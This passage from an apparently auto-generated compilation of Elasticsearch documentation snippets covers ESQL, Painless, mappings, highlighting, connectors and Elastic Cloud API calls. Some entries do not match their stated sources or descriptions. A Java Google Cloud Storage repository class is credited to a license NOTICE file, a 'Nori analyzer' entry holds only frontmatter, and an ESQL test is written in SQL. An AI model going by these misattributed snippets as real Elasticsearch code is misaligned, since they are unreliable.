     \"lat\": 40,\n            \"lon\": -70\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Counting Actors Using Painless in Elasticsearch\nDESCRIPTION: This script calculates the number of actors embedded as an array in the 'actors' field of a document. It requires that the 'actors' field be stored in a keyword format, or else values must be extracted from '_source'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs-mdx/painless/painless-field-context.mdx#2025-04-21_snippet_1\n\nLANGUAGE: Painless\nCODE:\n```\ndoc['actors'].size()\n```\n\n----------------------------------------\n\nTITLE: Matching Multi-position Tokens in Query String\nDESCRIPTION: Explains how to handle multi-position tokens in query strings using either match_phrase queries or boolean conjunctions. Adjusts the query parser's behavior with auto_generate_synonyms_phrase_query. Requires a functional Elasticsearch setup.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-simple-query-string-query.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"simple_query_string\": {\n      \"query\": \"ny city\",\n      \"auto_generate_synonyms_phrase_query\": false\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering Documents by Filename Using Reversed Path Hierarchy Tokenizer\nDESCRIPTION: This example searches for all files named 'my_photo1.jpg' within any directory by using a term query on the reversed path hierarchy field, demonstrating how to match from the end of file paths.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pathhierarchy-tokenizer.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET file-path-test/_search\n{\n  \"query\": {\n    \"term\": {\n      \"file_path.tree_reversed\": {\n        \"value\": \"my_photo1.jpg\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: String Literal Grammar Specification\nDESCRIPTION: Defines the grammar rules for string literals in Painless, supporting both single and double quotes with escape sequences.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-literals.md#2025-04-21_snippet_4\n\nLANGUAGE: text\nCODE:\n```\nSTRING: ( '\"'  ( '\\\\\"'  | '\\\\\\\\' | ~[\\\\\" ] )*? '\"'  )\n      | ( '\\'' ( '\\\\\\'' | '\\\\\\\\' | ~[\\\\' ] )*? '\\'' );\n```\n\n----------------------------------------\n\nTITLE: Using LENGTH and BYTE_LENGTH Functions in ESQL Query\nDESCRIPTION: An ESQL query that filters airports in India, keeps only the city column, and adds two computed columns using the LENGTH and BYTE_LENGTH functions. The example demonstrates that for non-ASCII characters like 'ā', the byte length can be greater than the character length.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/byte_length.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airports\n| WHERE country == \"India\"\n| KEEP city\n| EVAL fn_length = LENGTH(city), fn_byte_length = BYTE_LENGTH(city)\n```\n\n----------------------------------------\n\nTITLE: Defining Nori Analyzer Components in YAML\nDESCRIPTION: Lists the components of the nori analyzer, including the nori_tokenizer and various token filters. It also mentions supported settings for customization.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-nori-analyzer.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n---\nmapped_pages:\n  - https://www.elastic.co/guide/en/elasticsearch/plugins/current/analysis-nori-analyzer.html\n---\n```\n\n----------------------------------------\n\nTITLE: Creating Data Directory for PostgreSQL Example Data\nDESCRIPTION: Bash command to create a directory for storing the example PostgreSQL dataset.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nmkdir -p ~/data\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Date Format Usage in Elasticsearch\nDESCRIPTION: This snippet shows a note about using the 'date_optional_time' format and its potential issues when paired with numeric formats. It recommends using the strict version for better results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-date-format.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\nNOTE: When using `date_optional_time`, the parsing is lenient and will attempt to parse\nnumbers as a year (e.g. `292278994` will be parsed as a year). This can lead to unexpected results\nwhen paired with a numeric focused format like `epoch_second` and `epoch_millis`.\nIt is recommended you use `strict_date_optional_time` when pairing with a numeric focused format.\n```\n\n----------------------------------------\n\nTITLE: Quoting Reserved Keywords in Elasticsearch SQL\nDESCRIPTION: Example showing how to properly quote a reserved keyword (AS) when it needs to be used as an identifier in an Elasticsearch SQL query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-reserved.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSELECT \"AS\" FROM index\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with Term Vectors for Fast Vector Highlighter\nDESCRIPTION: Creates an index 'index2' with text fields configured for the Fast Vector Highlighter by enabling term vectors with positions and offsets for both standard and English analyzed fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_13\n\nLANGUAGE: json\nCODE:\n```\nPUT index2\n{\n  \"mappings\": {\n    \"properties\": {\n      \"comment\": {\n        \"type\": \"text\",\n        \"analyzer\": \"standard\",\n        \"term_vector\": \"with_positions_offsets\",\n        \"fields\": {\n          \"english\": {\n            \"type\": \"text\",\n            \"analyzer\": \"english\",\n            \"term_vector\": \"with_positions_offsets\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Plugin File with Option 2 Method (cURL)\nDESCRIPTION: This snippet shows how to update the file associated with an existing plugin extension using the Option 2 method. It uses a PUT request to upload the new plugin file directly.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_16\n\nLANGUAGE: sh\nCODE:\n```\ncurl -v -X PUT \"https://api.elastic-cloud.com/api/v1/deployments/extensions/EXTENSION_ID\" \\\n-H 'Content-type:application/zip' \\\n-H \"Authorization: ApiKey $CLOUD_API_KEY\" \\\n-H 'Expect:' \\\n-T \"/path_to/custom-plugin-8.4.3-10212022.zip\"\n```\n\n----------------------------------------\n\nTITLE: Double-Quoted String Examples\nDESCRIPTION: Demonstrates string literals using double quotes with various escape sequences.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-literals.md#2025-04-21_snippet_6\n\nLANGUAGE: painless\nCODE:\n```\n\"double-quoted string literal\"\n\"\\\"double-quoted with escaped double-quotes\\\" and backslash: \\\\\"\n\"double-quoted with non-escaped 'single-quotes'\"\n```\n\n----------------------------------------\n\nTITLE: Basic Compound Assignment Syntax\nDESCRIPTION: Shows the basic syntax structure for compound assignments where V is the variable/field and T is the type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-general.md#2025-04-21_snippet_4\n\nLANGUAGE: painless\nCODE:\n```\nV = (T)(V op expression);\n```\n\n----------------------------------------\n\nTITLE: Getting extension details with deployment information in Elasticsearch Service\nDESCRIPTION: API call to retrieve information about a specific extension including which deployments are currently using it. Uses the include_deployments parameter set to true.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_9\n\nLANGUAGE: sh\nCODE:\n```\ncurl -X GET \\\n  https://api.elastic-cloud.com/api/v1/deployments/extensions/EXTENSION_ID?include_deployments=true \\\n  -H 'Content-Type: application/json' \\\n  -H \"Authorization: ApiKey $CLOUD_API_KEY\" \\\n```\n\n----------------------------------------\n\nTITLE: Deleting Async EQL Search in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to manually delete an async EQL search before its retention period ends using the delete async EQL search API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_28\n\nLANGUAGE: console\nCODE:\n```\nDELETE /_eql/search/FmNJRUZ1YWZCU3dHY1BIOUhaenVSRkEaaXFlZ3h4c1RTWFNocDdnY2FSaERnUTozNDE=\n```\n\n----------------------------------------\n\nTITLE: Extracting Last Three Characters with SUBSTRING in ESQL\nDESCRIPTION: This example shows how to use negative start positions with the SUBSTRING function to extract characters relative to the end of the string. It extracts the last three characters from each last_name in the employees dataset.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/substring.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP last_name\n| EVAL ln_sub = SUBSTRING(last_name, -3, 3)\n```\n\n----------------------------------------\n\nTITLE: Running Docker Container for Elastic Connector Service\nDESCRIPTION: This Docker command runs the Elastic Connector Service container, mounting the configuration directory and setting up the network for communication with Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-graphql.md#2025-04-21_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Disabling Entire Mapping\nDESCRIPTION: Demonstrates how to disable the entire mapping configuration, which stores documents in _source without indexing any fields. Includes examples of document storage and retrieval.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/enabled.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"enabled\": false\n  }\n}\n\nPUT my-index-000001/_doc/session_1\n{\n  \"user_id\": \"kimchy\",\n  \"session_data\": {\n    \"arbitrary_object\": {\n      \"some_array\": [ \"foo\", \"bar\", { \"baz\": 2 } ]\n    }\n  },\n  \"last_updated\": \"2015-12-06T18:20:22\"\n}\n\nGET my-index-000001/_doc/session_1\n\nGET my-index-000001/_mapping\n```\n\n----------------------------------------\n\nTITLE: Statistics Gathering with DoubleSummaryStatistics in Java\nDESCRIPTION: This snippet defines the DoubleSummaryStatistics class, which provides mechanisms to collect statistics such as count, sum, min, max, and average of double values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_14\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.DoubleSummaryStatistics {\n  ()\n  void combine(DoubleSummaryStatistics)\n  double getAverage()\n  long getCount()\n  double getMax()\n  double getMin()\n  double getSum()\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Document with Search-as-you-type Field\nDESCRIPTION: Demonstrates indexing a document with a search_as_you_type field. The text is automatically analyzed and indexed in all subfields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/search-as-you-type.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/1?refresh\n{\n  \"my_field\": \"quick brown fox jump lazy dog\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring No-Match Behavior in Elasticsearch Highlighting\nDESCRIPTION: This example shows how to handle cases where no matching fragments are found by setting 'no_match_size' to 150, which returns a snippet from the beginning of the field when no matches are found.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_22\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"match\": { \"user.id\": \"kimchy\" }\n  },\n  \"highlight\": {\n    \"fields\": {\n      \"comment\": {\n        \"fragment_size\": 150,\n        \"number_of_fragments\": 3,\n        \"no_match_size\": 150\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Monitoring Request Cache Usage by Node in Elasticsearch\nDESCRIPTION: This command retrieves request cache statistics for all nodes using the nodes stats API. It specifically requests indices/request_cache metrics with human-readable formatting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/shard-request-cache.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /_nodes/stats/indices/request_cache?human\n```\n\n----------------------------------------\n\nTITLE: Configuring Machine Learning Circuit Breaker in Elasticsearch\nDESCRIPTION: Settings for the Machine Learning circuit breaker, which limits memory usage for trained models. It includes options for setting the memory limit, overhead factor, and breaker type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/circuit-breaker-settings.md#2025-04-21_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nbreaker.model_inference.limit: 50%\nbreaker.model_inference.overhead: 1\nbreaker.model_inference.type: memory\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Shard Tool Command Syntax\nDESCRIPTION: Shows the basic command syntax for the elasticsearch-shard tool with all available options for removing corrupted data from shards.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/shard-tool.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-shard remove-corrupted-data\n  ([--index <Index>] [--shard-id <ShardId>] | [--dir <IndexPath>])\n  [--truncate-clean-translog]\n  [-E <KeyValuePair>]\n  [-h, --help] ([-s, --silent] | [-v, --verbose])\n```\n\n----------------------------------------\n\nTITLE: Converting and Manipulating Dates with TO_DATEPERIOD in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the TO_DATEPERIOD function in ESQL. It shows how to convert a string to a datetime, add a date period, and subtract a date period using TO_DATEPERIOD. The function converts the input '3 days' into a date_period value for manipulation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_dateperiod.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW x = \"2024-01-01\"::datetime\n| EVAL y = x + \"3 DAYS\"::date_period, z = x - TO_DATEPERIOD(\"3 days\");\n```\n\n----------------------------------------\n\nTITLE: Create API Key for MongoDB Connector\nDESCRIPTION: This snippet shows how to create an API key for the MongoDB connector with necessary cluster and index privileges. It's required for the connector to access and index data. The API key's encoded value must be added to the connector's configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-mongodb.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n\"POST /_security/api_key\n{\n  \"name\": \"connector_name-connector-api-key\",\n  \"role_descriptors\": {\n        \"connector_name-connector-role\": {\n          \"cluster\": [\n            \"monitor\",\n            \"manage_connector\"\n          ],\n          \"indices\": [\n            {\n              \"names\": [\n                \"index_name\",\n                \".search-acl-filter-index_name\",\n                \".elastic-connectors*\"\n              ],\n              \"privileges\": [\n                \"all\"\n              ],\n              \"allow_restricted_indices\": false\n            }\n          ]\n        }\n      }\n    }\"\n```\n\n----------------------------------------\n\nTITLE: Dropbox Advanced Sync Rules - Query Only Example\nDESCRIPTION: Example of advanced sync rules for Dropbox connector using query matching on filenames\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-dropbox.md#2025-04-21_snippet_6\n\nLANGUAGE: js\nCODE:\n```\n[\n  {\n    \"query\": \"confidential\"\n  },\n  {\n    \"query\": \"dropbox\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: ZonedDateTime Methods and Fields\nDESCRIPTION: Lists the methods and fields available in the java.time.ZonedDateTime class, including Painless API augmentations. The focus is on how to create, parse, and manipulate date and time instances with time zone information, along with methods to convert, compare, and adjust ZonedDateTime objects.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_15\n\nLANGUAGE: java\nCODE:\n```\n\"class java.time.ZonedDateTime {\n  int getDayOfMonth()\n  DayOfWeek getDayOfWeek()\n  DayOfWeek org.elasticsearch.painless.api.Augmentation getDayOfWeekEnum()\n  int org.elasticsearch.painless.api.Augmentation getCenturyOfEra()\n  int org.elasticsearch.painless.api.Augmentation getEra()\n  int org.elasticsearch.painless.api.Augmentation getHourOfDay()\n  int org.elasticsearch.painless.api.Augmentation getMillisOfDay()\n  int org.elasticsearch.painless.api.Augmentation getMillisOfSecond()\n  int org.elasticsearch.painless.api.Augmentation getMinuteOfDay()\n  int org.elasticsearch.painless.api.Augmentation getMinuteOfHour()\n  int org.elasticsearch.painless.api.Augmentation getMonthOfYear()\n  int org.elasticsearch.painless.api.Augmentation getSecondOfDay()\n  int org.elasticsearch.painless.api.Augmentation getSecondOfMinute()\n  int org.elasticsearch.painless.api.Augmentation getWeekOfWeekyear()\n  int org.elasticsearch.painless.api.Augmentation getWeekyear()\n  int org.elasticsearch.painless.api.Augmentation getYearOfCentury()\n  int org.elasticsearch.painless.api.Augmentation getYearOfEra()\n  int getDayOfYear()\n  int getHour()\n  LocalDate toLocalDate()\n  LocalDateTime toLocalDateTime()\n  int getMinute()\n  Month getMonth()\n  int getMonthValue()\n  int getNano()\n  int getSecond()\n  int getYear()\n  ZonedDateTime from(TemporalAccessor)\n  ZonedDateTime minus(TemporalAmount)\n  ZonedDateTime minus(long,TemporalUnit)\n  ZonedDateTime minusYears(long)\n  ZonedDateTime minusMonths(long)\n  ZonedDateTime minusWeeks(long)\n  ZonedDateTime minusDays(long)\n  ZonedDateTime minusHours(long)\n  ZonedDateTime minusMinutes(long)\n  ZonedDateTime minusSeconds(long)\n  ZonedDateTime minusNanos(long)\n  ZonedDateTime of(LocalDate,LocalTime,ZoneId)\n  ZonedDateTime of(LocalDateTime,ZoneId)\n  ZonedDateTime of(int,int,int,int,int,int,int,ZoneId)\n  ZonedDateTime ofInstant(Instant,ZoneId)\n  ZonedDateTime ofInstant(LocalDateTime,ZoneOffset,ZoneId)\n  ZonedDateTime ofLocal(LocalDateTime,ZoneId,ZoneOffset)\n  ZonedDateTime ofStrict(LocalDateTime,ZoneOffset,ZoneId)\n  ZonedDateTime parse(CharSequence)\n  ZonedDateTime parse(CharSequence,DateTimeFormatter)\n  ZonedDateTime plus(TemporalAmount)\n  ZonedDateTime plus(long,TemporalUnit)\n  ZonedDateTime plusDays(long)\n  ZonedDateTime plusHours(long)\n  ZonedDateTime plusMinutes(long)\n  ZonedDateTime plusMonths(long)\n  ZonedDateTime plusNanos(long)\n  ZonedDateTime plusSeconds(long)\n  ZonedDateTime plusWeeks(long)\n  ZonedDateTime plusYears(long)\n  OffsetDateTime toOffsetDateTime()\n  ZonedDateTime truncatedTo(TemporalUnit)\n  ZonedDateTime with(TemporalAdjuster)\n  ZonedDateTime with(TemporalField,long)\n  ZonedDateTime withDayOfMonth(int)\n  ZonedDateTime withDayOfYear(int)\n  ZonedDateTime withEarlierOffsetAtOverlap()\n  ZonedDateTime withFixedOffsetZone()\n  ZonedDateTime withHour(int)\n  ZonedDateTime withLaterOffsetAtOverlap()\n  ZonedDateTime withMinute(int)\n  ZonedDateTime withMonth(int)\n  ZonedDateTime withNano(int)\n  ZonedDateTime withSecond(int)\n  ZonedDateTime withYear(int)\n  ZonedDateTime withZoneSameLocal(ZoneId)\n  ZonedDateTime withZoneSameInstant(ZoneId)\n}\"\n```\n\n----------------------------------------\n\nTITLE: Implementing Google Cloud Storage Repository in Java\nDESCRIPTION: This code snippet defines an abstract class for Google Cloud Storage repositories in Elasticsearch. It includes methods for initializing the repository, handling bucket names, and managing blob names.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/discovery-ec2/licenses/slf4j-api-NOTICE.txt#2025-04-22_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\nabstract class GoogleCloudStorageRepository extends BlobStoreRepository {\n    private final String bucket;\n    private final String clientName;\n    private final String basePath;\n\n    GoogleCloudStorageRepository(\n        final RepositoryMetadata metadata,\n        final NamedXContentRegistry namedXContentRegistry,\n        final BlobStoreFactory blobStoreFactory,\n        final String bucket,\n        final String clientName,\n        final String basePath\n    ) {\n        super(\n            metadata,\n            namedXContentRegistry,\n            blobStoreFactory.create(metadata, GoogleCloudStorageBlobStore.TYPE, buildSettings(metadata, bucket, clientName))\n        );\n        this.bucket = bucket;\n        this.clientName = clientName;\n        this.basePath = basePath;\n    }\n\n    private static Map<String, String> buildSettings(RepositoryMetadata metadata, String bucket, String clientName) {\n        final Map<String, String> settings = new HashMap<>(metadata.settings());\n        settings.put(GoogleCloudStorageBlobStore.BUCKET, bucket);\n        if (clientName != null) {\n            settings.put(GoogleCloudStorageBlobStore.CLIENT_NAME, clientName);\n        }\n        return settings;\n    }\n\n    // package private for testing\n    BlobPath basePath() {\n        return new BlobPath().add(basePath);\n    }\n\n    @Override\n    protected ByteSizeValue chunkSize() {\n        return GoogleCloudStorageBlobStore.MAX_CHUNK_SIZE;\n    }\n\n    @Override\n    public boolean hasAtomicOverwrites() {\n        return true;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering Buckets with Boolean Expression in Painless\nDESCRIPTION: A simple Painless script that determines whether to retain a bucket by checking if the sum of max value and base_cost exceeds 10. This script is used in a bucket selector aggregation context.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-bucket-selector-agg-context.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\nparams.max + params.base_cost > 10\n```\n\n----------------------------------------\n\nTITLE: Configuring Translog Sync Interval in Elasticsearch YAML\nDESCRIPTION: Sets how often the translog is fsync'ed to disk and committed, regardless of write operations. The default is 5 seconds, and values less than 100ms are not allowed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/translog.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nindex.translog.sync_interval: 5s\n```\n\n----------------------------------------\n\nTITLE: Executing Geo-polygon Query with Geohash\nDESCRIPTION: This snippet exemplifies using a geo-polygon query with geohash as one of the point formats. Elasticsearch must be able to decode geohashes and also support other point formats. Outputs include matched documents fitting within the polygon.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-polygon-query.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_polygon\": {\n          \"person.location\": {\n            \"points\": [\n              \"drn5x1g8cu2y\",\n              \"30, -80\",\n              \"20, -90\"\n            ]\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running Jira Connector End-to-End Tests\nDESCRIPTION: Shell commands for testing the Jira connector against an actual Jira instance. Includes options for running full tests or smaller, faster tests.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-jira.md#2025-04-21_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n$ make ftest NAME=jira\n```\n\nLANGUAGE: shell\nCODE:\n```\nmake ftest NAME=jira DATA_SIZE=small\n```\n\n----------------------------------------\n\nTITLE: Rounding in ESQL\nDESCRIPTION: This ESQL snippet demonstrates the use of the ROUND function to round a calculated value to one decimal place. It processes data from an `employees` table, using the KEEP clause to retain specific fields, then evaluates a new field `height_ft` that rounds the height multiplied by 3.281 to one decimal place. There are no additional dependencies required other than the data and table specified. The expected output includes the original and calculated field values in a transformed table format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/round.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\\n| KEEP first_name, last_name, height\\n| EVAL height_ft = ROUND(height * 3.281, 1)\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Analyzer with Edge NGram for Autocomplete in Elasticsearch\nDESCRIPTION: Example demonstrating how to set up a custom autocomplete analyzer using edge_ngram tokenizer with different analyzers for index and search time. The configuration includes creating a custom filter, defining an autocomplete analyzer, and setting up field mapping with separate index and search analyzers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/search-analyzer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"autocomplete_filter\": {\n          \"type\": \"edge_ngram\",\n          \"min_gram\": 1,\n          \"max_gram\": 20\n        }\n      },\n      \"analyzer\": {\n        \"autocomplete\": {\n          \"type\": \"custom\",\n          \"tokenizer\": \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"autocomplete_filter\"\n          ]\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"text\": {\n        \"type\": \"text\",\n        \"analyzer\": \"autocomplete\",\n        \"search_analyzer\": \"standard\"\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{\n  \"text\": \"Quick Brown Fox\"\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"match\": {\n      \"text\": {\n        \"query\": \"Quick Br\",\n        \"operator\": \"and\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Convert Client Keystore to PKCS#12\nDESCRIPTION: Converts the client's JKS keystore to PKCS#12 format for private key extraction\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/test/ssl/README.md#2025-04-21_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\nkeytool -importkeystore -srckeystore test-client.jks -srcstorepass keypass -destkeystore test-client.p12 -deststoretype PKCS12 -deststorepass keypass\n```\n\n----------------------------------------\n\nTITLE: Deprecating Specific API Paths and Components\nDESCRIPTION: This JSON example delineates marking specific API URL paths and their components as deprecated, providing structured metadata including the deprecation version and rationale.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/rest-api-spec/README.markdown#2025-04-21_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"api\": {\n    \"url\": {\n      \"paths\": [\n        {\n          \"path\":\"/{index}/{type}/{id}/_create\",\n          \"method\":\"PUT\",\n          \"parts\":{\n            \"id\":{\n              \"type\":\"string\",\n              \"description\":\"Document ID\"\n            },\n            \"index\":{\n              \"type\":\"string\",\n              \"description\":\"The name of the index\"\n            },\n            \"type\":{\n              \"type\":\"string\",\n              \"description\":\"The type of the document\",\n              \"deprecated\":true\n            }\n          },\n          \"deprecated\":{\n            \"version\":\"7.0.0\",\n            \"description\":\"Specifying types in urls has been deprecated\"\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running Backwards Compatibility Tests with Gradle\nDESCRIPTION: Command for running the REST API backwards compatibility tests using Gradle. These tests execute prior version YAML tests against the current cluster version.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/REST_API_COMPATIBILITY.md#2025-04-21_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\n./gradlew :rest-api-spec:yamlRestCompatTest\n```\n\n----------------------------------------\n\nTITLE: Parsing Log Data with DISSECT in ESQL\nDESCRIPTION: This ESQL query demonstrates how to use the DISSECT function to parse a log entry, extract specific fields (date, message, and IP address), and convert the date string to a datetime object. It also showcases the use of KEEP for selecting specific columns and EVAL for data transformation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/dissectWithToDatetime.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"2023-01-23T12:15:00.000Z - some text - 127.0.0.1\"\n| DISSECT a \"\"\"%{date} - %{msg} - %{ip}\"\"\"\n| KEEP date, msg, ip\n| EVAL date = TO_DATETIME(date)\n```\n\n----------------------------------------\n\nTITLE: Defining FilterScript Class in Java\nDESCRIPTION: This snippet defines the 'FilterScript' class which is part of the Elasticsearch scripting functionality, specifically whitelisted for usage in the fields API. It is essential for ensuring that the painless scripting engine can access the required classes and methods. No dependencies are specified beyond Elasticsearch's own requirements.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.filter.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.FilterScript @no_import {\n}\n\n```\n\n----------------------------------------\n\nTITLE: Testing ESQL Round Function with Default Precision\nDESCRIPTION: This snippet tests the round function without specifying precision, which should round to the nearest integer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/round.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSELECT round(1.23);\n```\n\n----------------------------------------\n\nTITLE: Defining Supported Types for String Pattern Matching in ESQL\nDESCRIPTION: A markdown table defining the supported input types and expected result type for string pattern matching in ESQL. It shows that keyword and text types can be matched against keyword patterns, resulting in a boolean output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/types/rlike.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| str | pattern | result |\n| --- | --- | --- |\n| keyword | keyword | boolean |\n| text | keyword | boolean |\n```\n\n----------------------------------------\n\nTITLE: Customized Keyed Date Range Aggregation in Elasticsearch\nDESCRIPTION: Illustrates a date range aggregation with custom keys for each range in Elasticsearch. The query uses specific date ranges with custom keys and expects a keyed response.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-daterange-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  